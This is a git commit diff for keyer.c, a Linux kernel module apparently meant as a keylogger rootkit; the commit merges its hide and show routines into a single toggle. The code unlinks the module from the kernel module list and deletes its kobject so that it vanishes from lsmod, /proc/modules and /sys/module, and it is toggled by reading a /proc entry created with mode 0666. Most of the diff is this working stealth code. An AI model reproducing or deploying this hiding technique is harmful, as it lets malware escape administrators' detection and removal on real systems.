6d860b414fb404600024021d58502e2974eb009d
faineance <faineance@users.noreply.github.com>
2014-11-20 19:29:23 +0000

    Fixed null pointer exception

--- keyer.c
+++ keyer.c
@@ -3,51 +3,42 @@
 #include <linux/init.h>      // included for __init and __exit macros
 #include <linux/proc_fs.h>   
 #include <linux/seq_file.h>  
+
+#define PROC_NAME "keyer"
 static char module_hidden = 1;
 
 
-static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
+static struct list_head *prev_module;
+static struct list_head *prev_kobj_module;
 
 static struct proc_dir_entry *keyer_entry;
 
-void module_hide(void) 
+void module_toggle(void)
 {
-	//Remove module entry from /sys/module which hides it in /proc/modules and lsmod
-	//While it is hidden the module cannot be uninstalled.
-	if (module_hidden) return;
-	//remove from modules list
-	module_previous = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	//remove kobjects and store just in case
-	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	list_del(&THIS_MODULE->mkobj.kobj.entry);
-	module_hidden = !module_hidden;
-}
+	int restore;
+	if (!module_hidden)
+	{
+    	list_add(&THIS_MODULE->list, prev_module);               
 
-void module_show(void) 
-{
-	int result;
-	if (!module_hidden) return;
-	//readd module
-	list_add(&THIS_MODULE->list, module_previous);
-	//restoring kobject to it's original place and adding it to /sys/module
-	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "keyer");
-	module_hidden = !module_hidden;
+		restore = kobject_add(&THIS_MODULE->mkobj.kobj,THIS_MODULE->mkobj.kobj.parent, PROC_NAME);
+		module_hidden = !module_hidden; 
+	}
+	else if  (module_hidden) 
+	{
+	    prev_module = THIS_MODULE->list.prev;             
+	    list_del(&THIS_MODULE->list);                   
+
+	    prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;           
+	    kobject_del(&THIS_MODULE->mkobj.kobj);                 
+		list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+		module_hidden = !module_hidden; 
+	}     
 }
 static int keyer_proc_show(struct seq_file *m, void *v) {
 	
-	if (module_hidden)
-	{
-		module_show();
-		seq_printf(m, "Hidden status toggled: No longer hidden \n");
-	}
-	else if (!module_hidden)
-	{
-		module_hide();
-		seq_printf(m, "Hidden status toggled: Hidden \n");
-	}
+	seq_printf(m, "Toggled hidden status\n");
+	module_toggle();
 	return 0;
 }
 static int keyer_proc_open(struct inode *inode, struct  file *file) {
@@ -64,16 +55,16 @@ static const struct file_operations proc_file_fops = {
 static int __init keyer_init(void)
 {
 	printk(KERN_INFO "Hello world!\n");
-	keyer_entry = proc_create("keyer", 0666, NULL, &proc_file_fops);
+	keyer_entry = proc_create(PROC_NAME, 0666, NULL, &proc_file_fops);
 	if (keyer_entry == NULL) return 0;
 	
-    
+
     return 0;    // Non-zero return means that the module couldn't be loaded.
 }
 
 static void __exit keyer_cleanup(void)
 {
-	remove_proc_entry("keyer", NULL);
+	remove_proc_entry(PROC_NAME, NULL);
 	printk(KERN_INFO "Cleaning up module.\n");
 
 }
